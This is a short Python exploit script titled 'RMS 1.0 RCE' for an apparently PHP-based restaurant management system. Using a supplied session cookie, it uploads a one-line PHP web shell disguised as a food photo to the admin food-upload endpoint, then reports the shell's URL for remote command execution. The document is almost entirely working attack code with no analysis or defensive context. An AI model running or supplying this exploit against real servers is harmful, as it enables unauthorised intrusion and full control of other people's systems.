# RMS 1.0 RCE

#!/usr/bin/env python3
import sys, requests

def main():
        targetURL = f"{url}admin/foods-exec.php"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Content-Length": "327",
            "Content-Type": "multipart/form-data; boundary=---------------------------191691572411478",
            "Connection": "close",
        	"Referer": "http://localhost:8081/rms/admin/foods.php",
        	"Cookie": f"PHPSESSID={PHPSESSID}",
        	"Upgrade-Insecure-Requests": "1"
            }
        data = """

        -----------------------------191691572411478
        Content-Disposition: form-data; name="photo"; filename="reverse-shell.php"
        Content-Type: text/html

        <?php echo shell_exec($_GET["cmd"]); ?>
        -----------------------------191691572411478
        Content-Disposition: form-data; name="Submit"

        Add
        -----------------------------191691572411478--
        """
        r = requests.post(targetURL, verify=False, headers=headers,data=data,proxies=proxy)
        print(f"Shell uploaded at: {url}images/reverse-shell.php")

if __name__ == "__main__":
    proxy = {"http":"http://localhost:8080"}
    try:
        url = sys.argv[1]
        PHPSESSID = sys.argv[2]
    except:
        print(f"Usage: {sys.argv[0]} <url> <PHPSESSID>")
        print(f"Example: {sys.argv[0]} http://example.com/rms 9qraghmmplqi3e931u73n2tnp3")
        sys.exit()
    if url[-1] != "/":
        url = f"{url}/"
    main()
